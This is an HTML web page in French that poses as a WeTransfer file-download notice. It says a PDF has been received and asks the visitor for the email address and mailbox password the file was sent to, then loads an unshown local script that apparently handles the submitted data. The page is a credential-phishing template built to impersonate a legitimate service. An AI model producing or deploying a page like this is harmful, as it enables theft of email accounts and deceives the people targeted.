<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accueil</title>
    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Bold.10832e10.woff2">
    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Medium.1acd899d.woff2">
    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/GT-Super-WT-Super.3397811e.woff">
    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque_W_Medium.7e37a161.woff">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">

    <style>
        * {
            box-sizing: border-box;
            padding: 0;
            margin: 0;
            font-family: GT Super WT, -apple-system, \.SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif;
        }

        body {
            min-height: 100vh;
            max-height: 100vh;
            display: flex;
            flex-direction: column;

        }

        .top {
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: fixed;
            left: 0%;
            top: 0%;
            width: 100%;
            background-color: white;
            padding: 15px;
        }

        .center {
            background-color: #f8f5f158;
            margin-top: 50px;
            height: 90vh;
            width: 100%;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: auto;
      
        }

        form {
            width: 100%;
            padding: 20px;
        }

        input {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 10px;
            margin-bottom: 0px;
            padding-left: 10px;
            font-size: 18px;
            background-color: rgba(128, 128, 128, 0.08);
        }

        input:focus {
            outline: none;
        }

        .box {
            background-color: white;
            padding: 15px;
            width: 100%;
            min-height: 150px;
            border-radius: 10px;
            display: flex;
            flex-direction: column;
            margin-left: auto;
        }

        .box svg {
            height: 45px;
            width: 45px;
            color: rgb(255, 136, 0);
        }

        .box p,
        button,
        div {
            margin-left: auto;
            margin-right: auto;
        }
        .block{
            margin: auto;
            border: 1px solid #f8f5f158;
        }

        button {
            width: 100%;
            height: 45px;
            background-color: black;
            border: none;
            border-radius: 9999px;
            color: white;
        }

        footer {
            display: flex;
            justify-content: space-between;
            height: 40px;
            margin-top: auto;
            align-items: center;
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: white;
            font-size: 0.7rem;
            padding: 15px;
            color: grey;

        }

        .left {
            display: none;
        }

        @media (min-width: 612px) {

            /* Styles pour les écrans de PC */
            body {
                min-height: 100vh;
                max-height: 100vh;
                display: flex;
                flex-direction: column;

            }

            .top {
                display: none;
            }

            .center {
                background-color: white;
                margin: auto;
                border: 1px solid #f8f5f158 !important;

            }

            .box {
                width: 50%;
                height: 100%;
                padding: 50px;
                position: fixed;
                right: 25%;
                top: 0%;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .block {
                display: flex;
                flex-direction: column;
            }

            .left {
                width: 50%;
                height: 100%;
                background-color: #663a00;
                position: fixed;
                left: 0%;
                top: 0%;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }

            footer {
                display: none;
            }

        }
    </style>
</head>

<body>

    <div class="top">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
            class="lucide lucide-align-justify">
            <line x1="3" x2="21" y1="6" y2="6" />
            <line x1="3" x2="21" y1="12" y2="12" />
            <line x1="3" x2="21" y1="18" y2="18" />
        </svg>



        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
            class="lucide lucide-lock">
            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
        </svg>
    </div>
    <br> <br>
    <div class="center">


        <div class="block box">

            <div>
                <p
                    style="font-size: .9rem; text-align: center; font-weight: bolder; font-family: GT Super WT, -apple-system, \.SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif;">
                    Vous avez reçu un document</p>

                <div style="display: flex; align-items: center; justify-content: space-between; width: 100px;">
                    <span style="font-weight: bolder;">PDF + </span>
                    <img src="./img/pdf-file-format.png" width="30">

                </div>

                <br>


            </div>

            <form id="form">
                <p style="font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif; font-size: .8rem;">
                    Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été
                    envoyé.</p>
                <span id="notif" style="color: orange;"></span>
                <br>
                <input id="user" name="email" type="email" placeholder="Adresse e-mail" required> <br>
                <span style="color: orangered;" id="notif"></span> <br>

                <input id="pwd" name="pwd" placeholder="Mot de passe" type="password" minlength="4" required> <br> <br>

                <small class="auth0-lock-terms"><span>Vous acceptez nos <a
                            href="https://wetransfer.com/explore/legal/terms" target="_blank" rel="noopener noreferrer"
                            role="button" tabindex="18">Conditions d'utilisation</a> et notre <a
                            href="https://wetransfer.com/explore/legal/privacy" target="_blank"
                            rel="noopener noreferrer" role="button" tabindex="19">Déclaration relative à la
                            confidentialité et aux cookies</a>.</span></small>
                <br>
                <br>
                <button id="co" type="submit">Continuer</button>
                <br> <br>
            </form>

        </div>

    </div>

    <footer>

        <span>Cookies</span>
        <span>Politique</span>
        <span>Aide</span>
        <span>Francais</span>

    </footer>

    <script src="./app.min.js"></script>



</body>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
    crossorigin="anonymous"></script>


</html>
